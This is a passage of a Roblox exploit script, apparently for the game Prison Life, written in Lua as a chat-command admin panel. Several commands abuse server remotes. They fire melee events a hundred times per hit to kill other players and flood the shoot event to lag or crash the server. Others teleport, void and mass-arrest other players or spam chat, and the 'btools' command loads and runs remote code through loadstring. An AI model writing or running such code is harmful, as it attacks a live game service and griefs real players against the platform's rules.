				Notify("Viewing "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
			while wait() do
				if Watching ~= nil then
					pcall(function()
						workspace.CurrentCamera.CameraSubject = workspace[Watching.Name]
					end)
				end
			end
		end
		if Command("antifling") then
			States.Anti_Fling = true
			Notify("Turn anti fling on", Color3.fromRGB(0, 255, 0), "Success")
			game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size = Vector3.new(math.huge, game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size.Y, math.huge)
			game.Players.LocalPlayer.CharacterAdded:Connect(function(Character)
				if States.Anti_Fling then
					pcall(function()
						game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size = Vector3.new(math.huge, game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size.Y, math.huge)
					end)
				end
			end)
		end
		if Command("statue") then
			States.Statue = true
			game.Players.LocalPlayer.Character:Connect(function()
				if States.Statue then

				end
			end)
		end
		if Command("unstatue") then
			States.Statue = false
		end
		if Command("noclip") or Command("noclips") then
			States.Noclips = true
			Notify("Turn no clips on", Color3.fromRGB(0, 255, 0), "Success")
			game:GetService("RunService").Stepped:Connect(function()
				if States.Noclips then
					pcall(function()
						game.Players.LocalPlayer.Character:FindFirstChild("Head").CanCollide = false
						game.Players.LocalPlayer.Character:FindFirstChild("Torso").CanCollide = false
					end)
				end
			end)
		end
		if Command("clip") or Command("clips") then
			States.Noclips = false
			Notify("Turn no clips off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("unantifling") then
			States.Anti_Fling = false
			Notify("Turn anti fling off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("antivest") or Command("anticrash") then
			States.Anti_Crash = true
			Notify("Turn anti armor spammer on", Color3.fromRGB(0, 255, 0), "Success")
			coroutine.wrap(function()
				while wait() do
					if States.Anti_Crash then
						for i,v in pairs(game.Players:GetPlayers()) do
							pcall(function()
								v.Character.vest:Destroy()
							end)
						end
					end
				end
			end)()
		end
		if Command("unantivest") or Command("unanticrash") then
			States.Anti_Crash = false
			Notify("Turn anti armor spammer off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("fastpunch") or Command("speedpunch") or Command("speedlypunch") or Command("superspeedpunch") then
			States.Fast_Punch = true
			Notify("Turn fast punch on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("slowpunch") or Command("normalspeedpunch") or Command("nofastpunch") or Command("unfastpunch") then
			States.Fast_Punch = false
			Notify("Turn fast punch off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("superpunch") or Command("onepunch") then
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local MeleeEvent = ReplicatedStorage:FindFirstChild("meleeEvent")
			local Mouse = game.Players.LocalPlayer:GetMouse()
			local Punch = false
			local Cooldown = false
			States.SuperPunch = true
			Notify("Turn super punch on", Color3.fromRGB(0, 255, 0), "Success")

			local function Punch()
				if not States.Fast_Punch then
					Cooldown = true
					local Part = Instance.new("Part", game.Players.LocalPlayer.Character)
					Part.Transparency = 1
					Part.Size = Vector3.new(5, 2, 3)
					Part.CanCollide = false
					local Weld = Instance.new("Weld", Part)
					Weld.Part0 = game.Players.LocalPlayer.Character.Torso
					Weld.Part1 = Part
					Weld.C1 = CFrame.new(0, 0, 2)
					Part.Touched:connect(function(Touch)
						if game.Players:FindFirstChild(Touch.Parent.Name) then
							local plr = game.Players:FindFirstChild(Touch.Parent.Name) 
							if plr.Name ~= game.Players.LocalPlayer.Name then
								Part:Destroy()
								for i = 1,100 do
									MeleeEvent:FireServer(plr)
								end
							end
						end
					end)
					wait(0.9)
					Cooldown = false
					Part:Destroy()
				else
					Cooldown = true
					local Part = Instance.new("Part", game.Players.LocalPlayer.Character)
					Part.Transparency = 1
					Part.Size = Vector3.new(5, 2, 3)
					Part.CanCollide = false
					local Weld = Instance.new("Weld", Part)
					Weld.Part0 = game.Players.LocalPlayer.Character.Torso
					Weld.Part1 = Part
					Weld.C1 = CFrame.new(0, 0, 2)
					Part.Touched:connect(function(Touch)
						if game.Players:FindFirstChild(Touch.Parent.Name) then
							local plr = game.Players:FindFirstChild(Touch.Parent.Name) 
							if plr.Name ~= game.Players.LocalPlayer.Name then
								Part:Destroy()
								for i = 1,100 do
									MeleeEvent:FireServer(plr)
								end
							end
						end
					end)
					wait(0.1)
					Cooldown = false
					Part:Destroy()
				end
			end
			Mouse.KeyDown:connect(function(Key)
				if not Cooldown and States.SuperPunch then
					if Key:lower() == "f" then
						Punch()
					end				
				end
			end)
		end
		if Command("normalpunch") or Command("oldpunch") or Command("nosuperpunch") or Command("stoponepunch") or Command("unonepunch") or Command("unsuperpunch") then
			States.SuperPunch = false
			Notify("Turn super punch off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("superknife") then
			local Knife = game.Players.LocalPlayer.Backpack:FindFirstChild("Crude Knife") or game.Players.LocalPlayer.Character:FindFirstChild("Crude Knife")
			if not Knife then
				workspace.Remote.ItemHandler:InvokeServer(workspace["Prison_ITEMS"].single["Crude Knife"].ITEMPICKUP)
			end
			wait()
			Knife = game.Players.LocalPlayer.Backpack:FindFirstChild("Crude Knife") or game.Players.LocalPlayer.Character:FindFirstChild("Crude Knife")
			if Knife then
				local Cooldown = false
				local Hitting = false
				local Hitted = false
				Knife.Equipped:Connect(function()
					Knife.Activated:Connect(function()
						if not Cooldown then
							Cooldown = true
							Hitting = true
							for i,v in pairs(Knife:GetChildren()) do
								if v:IsA("Part") then
									v.Touched:Connect(function(Hit)
										if Hit and Hit.Parent ~= game.Players.LocalPlayer and not Hitted and Hitting then
											Hitted = true
											for i = 1,25 do
												game.ReplicatedStorage.meleeEvent:FireServer(game.Players[Hit.Parent.Name])
											end
										end
									end)
								end
							end
							wait(0.5)
							Cooldown = false
							Hitting = false
							Hitted = false
						end
					end)
				end)
			end
			Notify("Obtained super knife", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("unview") or Command("unspectate") or Command("stopwatch") or Command("unwatch") then
			Watching = nil
			workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			Notify("Unviewed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("antivoid") or Command("antifell") then
			States.Anti_Void = true
			Notify("Turn anti void on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.Anti_Void then
					pcall(function()
						if game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y < 1 then
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(888, 100, 2388)
						end
					end)
				end
			end
		end
		if Command("unantivoid") or Command("unantifell") then
			States.Anti_Void = false
			Notify("Turn anti void off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("bring") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Teleport(GetPlayer(Arg2), game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
				Notify("Brought "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("teleport") or Command("tp") then
			local Player = GetPlayer(Arg2)
			local Player2 = GetPlayer(Arg3)
			if Player ~= nil and Player2 ~= nil then
				TeleportV(Player, Player2)
				Notify("Teleported "..Player.Name.." to "..Player2.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(0, 255, 0), "Error")
			end
		end
		if Command("void") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Teleport(Player, CFrame.new(999999, 999999, 999999))
				Notify("Voided "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("killaura") then
			States.Kill_Aura = true
			Notify("Turn kill aura on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("nokillaura") or Command("unkillaura") then
			States.Kill_Aura = false
			Notify("Turn kill aura off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("auto") or Command("autore") or Command("autorefresh") then
			States.Auto_Refresh = true
			Notify("Turn auto refresh on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.Auto_Refresh == true then
					pcall(function()
						if game.Players.LocalPlayer.Character.Humanoid.Health < 1 then
							if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
								if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
									local savedcf = GetPos()
									local savedcamcf = GetCamPos()
									workspace.Remote.loadchar:InvokeServer()
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
									workspace.CurrentCamera.CFrame = savedcamcf
								end
							else
								if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
									local savedcf = GetPos()
									local savedcamcf = GetCamPos()
									workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
									workspace.CurrentCamera.CFrame = savedcamcf
									workspace.Remote.TeamEvent:FireServer("Medium stone grey")
								end
							end
						end
					end)
				end
			end
		end
		if Command("unauto") or Command("auntore") or Command("unautorefresh") then
			States.Auto_Refresh = false
			Notify("Turn auto refresh off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("prefix") or Command("newprefix") or Command("changeprefix") then
			local NewPrefix = Arg2
			if NewPrefix ~= nil then
				Prefix = NewPrefix
				Execute.PlaceholderText = "Press "..Prefix.." To Enter"
				Notify("Changed prefix to "..NewPrefix, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Text needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("speed") or Command("walkspeed") or Command("setspeed") or Command("setwalkspeed") then
			local WalkSpeed = tonumber(Arg2)
			if WalkSpeed ~= nil then
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = WalkSpeed
				Notify("Changed walk speed to "..WalkSpeed, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("jumppower") or Command("jumphigh") or Command("setjumppower") then
			local JumpPower = tonumber(Arg2)
			if JumpPower ~= nil then
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
				Notify("Changed jump power to "..JumpPower, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("hipheight") or Command("sethipheight") then
			local HipHeight = tonumber(Arg2)
			if HipHeight ~= nil then
				game.Players.LocalPlayer.Character.Humanoid.HipHeight = HipHeight
				Notify("Changed hip height to "..HipHeight, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("lagserver") or Command("disconnect") then
			States.Lag_Server = true
			Notify("Lagging server", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.Lag_Server then
					coroutine.wrap(function()
						pcall(function()
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)

							local Gun = game.Players.LocalPlayer.Backpack["Remington 870"] or game.Players.LocalPlayer.Character["Remington 870"]

							local args = {
								[1] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [2] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [3] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [4] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [5] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [6] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [7] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [8] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}
							}

							game:GetService("ReplicatedStorage").ShootEvent:FireServer(args, Gun)
						end)
					end)()
				end
			end
		end
		if Command("unlagserver") or Command("stopdisconnect") or Command("undisconnect") then
			States.Lag_Server = false
			Notify("Unlagging server", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("gravity") or Command("setgravity") then
			local Gravity = tonumber(Arg2)
			if Gravity ~= nil then
				workspace.Gravity = Gravity
				Notify("Changed gravity to "..Gravity, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Count needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("makecrim") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Teleport(Player, CFrame.new(-919, 96, 2138))
				Notify("Crimmed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("resetgravity") or Command("regravity") then
			workspace.Gravity = 196.2
			Notify("Resetted gravity", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("resethipheight") or Command("rehipheight") then
			game.Players.LocalPlayer.Character.Humanoid.HipHeight = 0
			Notify("Resetted hip height", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("resetspeed") or Command("respeed") then
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
			Notify("Resetted walk speed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("resetjumppower") or Command("rejumppower") then
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
			Notify("Resetted jump power", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("leave") or Command("leaveserver") or Command("quit") then
			Notify("Leaving server", Color3.fromRGB(0, 255, 0), "Success")
			wait(.1)
			game:Shutdown()
		end
		if Command("rejoin") or Command("rj") then
			Notify("Rejoining server", Color3.fromRGB(0, 255, 0), "Success")
			wait(.1)
			game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
		end
		if Command("nodoors") or Command("deletedoors") then
			if workspace:FindFirstChild("Doors") then
				workspace.Doors.Parent = game.Lighting
			end
			Notify("Deleted doors", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("doors") or Command("restoredoors") then
			if game.Lighting:FindFirstChild("Doors") then
				game.Lighting.Doors.Parent = workspace
			end
			Notify("Restored doors", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("nowalls") or Command("deletedoors") then
			pcall(function()
				for i,v in pairs(Walls) do
					v.Parent = game.Lighting
				end
			end)
			Notify("Deleted walls", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("walls") or Command("restorewalls") then
			pcall(function()
				for i,v in pairs(game.Lighting:GetChildren()) do
					if v.Name ~= "Doors" then
						v.Parent = workspace
					end
				end
			end)
			Notify("Restored walls", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("god") or Command("godmode") then
			States.God_Mode = true
			Notify("Turn god mode on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.God_Mode then
					game.Players.LocalPlayer.Character.Humanoid.Name = 1
					local l = game.Players.LocalPlayer.Character["1"]:Clone()
					l.Parent = game.Players.LocalPlayer.Character
					l.Name = "Humanoid"
					game.Players.LocalPlayer.Character.Animate.Disabled = true
					wait()
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					game.Players.LocalPlayer.Character["1"]:Destroy()
					game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
					wait(5)
					local savedcf = GetPos()
					local savedcamcf = GetCamPos()
					local savedteam = GetTeam()
					workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new(savedteam).Name)
					workspace.CurrentCamera.CFrame = savedcamcf
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				end
			end
		end
		if Command("ungod") or Command("ungodmode") then
			States.God_Mode = false
			Notify("Turn god mode off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("arrest") or Command("handcuffs") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Arrest(Player, tonumber(Arg3))
				Notify("Arrested "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("arrestall") or Command("arrestother") or Command("arrestothers") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					if v.TeamColor.Name == "Really red" then
						Arrest(v, 30)
					end
				end
			end
			Notify("Arrested all criminals", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("opengate") then
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"])
			Notify("Opened gate", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("getpos") then
			print("Humanoid Root Part Position :")
			print(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
			print("Camera CFrame :")
			print(workspace.CurrentCamera.CFrame)
			Notify("Printed positions", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("saveposition") or Command("savepos") then
			States.SavedCFrame = GetPos()
			Notify("Saved positions", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loadposition") or Command("loadpos") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = States.SavedCFrame
			Notify("Loaded positions", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("spamchat") then
			States.SpamChat = true
			Notify("Spamming chat", Color3.fromRGB(0, 255, 0), "Success")
			if tonumber(Arg2) ~= nil then
				States.Spam_Wait = tonumber(Arg2)
			else
				States.Spam_Wait = 1
			end
			while wait() do
				if States.SpamChat then
					local MessagesToChat = {
						"I'm your dad",
						"I'm your mom",
						"I'm a god and I'm your dad",
						"__________",
						"OMG",
						"OML",
						"BEPP BOP BEEP BEEP BOP",
						" ",
						"I'm magic guy because i pressed W,A,S and D on my keyboard and my character can be walked wow, I'M THE REAL MAGIC GUY!",
						"I'M THE MOST PRO IN HERE",
						"I'M A PRO IN THIS SERVER ALL OF YOU ARE NOOB!",
						"LOL XD LOL XD LOL XD",
						"Read my chat",
						"Can you die while you are died?",
						"You know what, I'm a god",
						"Sub to CXZ NAME_R",
						"WOW",
						"wow",
						"\(￣︶￣*\))"
					}

					while true do
						wait(States.Spam_Wait)
						if States.SpamChat then
							pcall(function()
								Chat(MessagesToChat[math.random(1, #MessagesToChat)])
							end)
						end
					end
				end
			end
		end
		if Command("unspamchat") then
			States.SpamChat = false
			Notify("Unspamming chat", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("rapidfire") then
			local Tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
			local Name
			local Req
			if Tool then
				Notify("Activated rapid fire", Color3.fromRGB(0, 255, 0), "Success")
				States.CAN = true
				Name = Tool.Name
				if Tool:FindFirstChild("GunStates") then
					Req = require(Tool.GunStates)
					Req["MaxAmmo"] = Req["MaxAmmo"]
					Req["StoredAmmo"] = Req["StoredAmmo"]
					Req["AmmoPerClip"] = Req["AmmoPerClip"]
					Req["CurrentAmmo"] = Req["CurrentAmmo"]
					Req["FireRate"] = -math.huge
					Req["Bullets"] = 25
					Req["Range"] = math.huge
					Req["Damage"] = math.huge
					Req["ReloadTime"] = -math.huge
					Req["AutoFire"] = true
				end
			end
			while wait() do
				pcall(function()
					if game.Players.LocalPlayer.Character:FindFirstChild(Name) and States.CAN then
						if Req["CurrentAmmo"] < 1 then
							Tool:Destroy()
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Name].ITEMPICKUP)
							Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(Name)
							if Tool then
								Name = Tool.Name
								Tool.Parent = game.Players.LocalPlayer.Character
								Tool = game.Players.LocalPlayer.Character[Name]
								Req = require(Tool.GunStates)
								Req["MaxAmmo"] = Req["MaxAmmo"]
								Req["StoredAmmo"] = Req["StoredAmmo"]
								Req["AmmoPerClip"] = Req["AmmoPerClip"]
								Req["CurrentAmmo"] = Req["CurrentAmmo"]
								Req["FireRate"] = -math.huge
								Req["Bullets"] = 25
								Req["Range"] = math.huge
								Req["Damage"] = math.huge
								Req["ReloadTime"] = -math.huge
								Req["AutoFire"] = true
							end
						end
					end
				end)
			end
		end
		if Command("autorapidfire") then
			States.Auto_RapidFire = true
			Notify("Turn auto rapid fire on", Color3.fromRGB(0, 255, 0), "Success")
			game.Players.LocalPlayer.CharacterAdded:Connect(function()
				game.Players.LocalPlayer.Character.ChildAdded:Connect(function(Item)
					if States.Auto_RapidFire then
						local Tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
						local Name
						local Req
						if Tool then
							States.CAN = true
							Name = Tool.Name
							if Tool:FindFirstChild("GunStates") then
								Req = require(Tool.GunStates)
								Req["MaxAmmo"] = Req["MaxAmmo"]
								Req["StoredAmmo"] = Req["StoredAmmo"]
								Req["AmmoPerClip"] = Req["AmmoPerClip"]
								Req["CurrentAmmo"] = Req["CurrentAmmo"]
								Req["FireRate"] = -math.huge
								Req["Bullets"] = 25
								Req["Range"] = math.huge
								Req["Damage"] = math.huge
								Req["ReloadTime"] = -math.huge
								Req["AutoFire"] = true
							end
						end
						while wait() do
							pcall(function()
								if game.Players.LocalPlayer.Character:FindFirstChild(Name) and States.CAN then
									if Req["CurrentAmmo"] < 1 then
										Tool:Destroy()
										workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Name].ITEMPICKUP)
										Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(Name)
										if Tool then
											Name = Tool.Name
											Tool.Parent = game.Players.LocalPlayer.Character
											Tool = game.Players.LocalPlayer.Character[Name]
											Req = require(Tool.GunStates)
											Req["MaxAmmo"] = Req["MaxAmmo"]
											Req["StoredAmmo"] = Req["StoredAmmo"]
											Req["AmmoPerClip"] = Req["AmmoPerClip"]
											Req["CurrentAmmo"] = Req["CurrentAmmo"]
											Req["FireRate"] = -math.huge
											Req["Bullets"] = 25
											Req["Range"] = math.huge
											Req["Damage"] = math.huge
											Req["ReloadTime"] = -math.huge
											Req["AutoFire"] = true
										end
									end
								end
							end)
						end
					end
				end)
			end)
			if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
			else
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
				workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			end
		end
		if Command("unautorapidfire") then
			States.Auto_RapidFire = false
			if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
			else
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
				workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			end
			Notify("Turn auto rapid fire off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("notifybar") then
			Background4.Visible = true
		end
		if Command("loopbring") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Notify("Looping bring "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
				States.PlayerToLoopBring = Player
				States.LoopBring = true
				repeat wait()
					pcall(function()
						if States.LoopBring and game.Players[States.PlayerToLoopBring.Name] then
							local savedcf = GetPos()
							Teleport(States.PlayerToLoopBring, GetPos())
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
						end
					end)
				until States.LoopBring == false
			end
		end
		if Command("unloopbring") then
			States.LoopBring = false
			States.PlayerToLoopBring = nil
			Notify("Unlooping bring", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("admin") or Command("giveadmin") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and not Admin[Player.UserId] then
				Admin[Player.UserId] = {Player = Player}
				Chat("/w "..Player.Name.." You've got admin permissions! Type "..Prefix.."cmds or "..Prefix.."cmd to see all commands")
				Notify("Gave "..Player.Name.." admin commands", Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found / already admin", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("unadmin") or Command("removeadmin") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and Admin[Player.UserId] then
				Admin[Player.UserId] = nil
				Chat("/w "..Player.Name.." You are bad you've been removed admin permissions")
				Notify("Removed admins from "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found / already admin", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("baseballbat") or Command("bat") then
			local LocalPlayer = game.Players.LocalPlayer
			local Character = LocalPlayer.Character
			local Backpack = LocalPlayer.Backpack
			local Humanoid = Character.Humanoid
			if not Backpack:FindFirstChild("Bat") or not Backpack:FindFirstChild("Bat") then
				local BaseBallBat = Instance.new("Tool", Backpack)
				local Handle = Instance.new("Part", BaseBallBat)
				BaseBallBat.GripPos = Vector3.new(0, -1.15, 0)
				BaseBallBat.Name = "Bat"
				Handle.Name = "Handle"
				Handle.Size = Vector3.new(0.4, 5, 0.4)
				local Animation =Instance.new("Animation", BaseBallBat)
				Animation.AnimationId = "rbxassetid://218504594"
				local Track = Humanoid:LoadAnimation(Animation)
				local Cooldown = false
				local Attacked = false
				local Attacking = false
				BaseBallBat.Equipped:Connect(function()
					BaseBallBat.Activated:Connect(function()
						if not Cooldown then
							Cooldown = true
							Attacking = true
							Track:Play()
							Handle.Touched:Connect(function(Hit)
								if Hit.Parent and Hit.Parent ~= game.Players.LocalPlayer and not Attacked and Attacking then
									Attacked = true
									for i = 1,15 do
										game.ReplicatedStorage.meleeEvent:FireServer(game.Players[Hit.Parent.Name])
									end
								end
							end)
							wait(0.25)
							Cooldown = false
							Attacked = false
							Attacking = false
						end
					end)
				end)
			end
			Notify("Obtained base ball bat", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("tools") or Command("tool") or Command("btool") or Command("btools") then
			local Backpack = game.Players.LocalPlayer.Backpack
			local Character = game.Players.LocalPlayer.Character
			if not Backpack:FindFirstChild("Bin_1") and not Character:FindFirstChild("Bin_1") then
				local HopperBin_1 = Instance.new("HopperBin", Backpack)
				HopperBin_1.BinType = 1
				HopperBin_1.Name = "Bin_1"
			end
			if not Backpack:FindFirstChild("Bin_2") and not Character:FindFirstChild("Bin_2") then
				local HopperBin_2 = Instance.new("HopperBin", Backpack)
				HopperBin_2.BinType = 2
				HopperBin_2.Name = "Bin_2"
			end
			if not Backpack:FindFirstChild("Bin_3") and not Character:FindFirstChild("Bin_3") then
				local HopperBin_3 = Instance.new("HopperBin", Backpack)
				HopperBin_3.BinType = 3
				HopperBin_3.Name = "Bin_3"
			end
			if not Backpack:FindFirstChild("Bin_4") and not Character:FindFirstChild("Bin_4") then
				local HopperBin_4 = Instance.new("HopperBin", Backpack)
				HopperBin_4.BinType = 4
				HopperBin_4.Name = "Bin_4"
			end
			loadstring(game:GetObjects("rbxassetid://552440069")[1].Source)()
			Notify("Obtained btools", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("test") then
			local savedcf = GetPos()
			local CrimPad = workspace["Criminals Spawn"].SpawnLocation
			local padcf = CrimPad.CFrame
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CrimPad.CFrame
			wait()
			CrimPad.CFrame = GetPos()
			CrimPad.CanCollide = false
			CrimPad.Transparency = 1.000
			CrimPad.Anchored = true 
			pcall(function()
				for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
					if v ~= game.Players.LocalPlayer then
						CrimPad.CFrame = v.Character.HumanoidRootPart.CFrame
					end
				end
				for i,v in pairs(game.Teams.Guards:GetPlayers()) do
					if v ~= game.Players.LocalPlayer then
						CrimPad.CFrame = v.Character.HumanoidRootPart.CFrame
					end
				end
			end)
			workspace.Remote.loadchar:InvokeServer()
			CrimPad.Transparency = 0.000
			CrimPad.CFrame = padcf
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			Notify("???", Color3.fromRGB(0, 0, 0), "LOL")
		end
		if Command("antilag") or Command("boostfps") then
			States.BoostFps = true
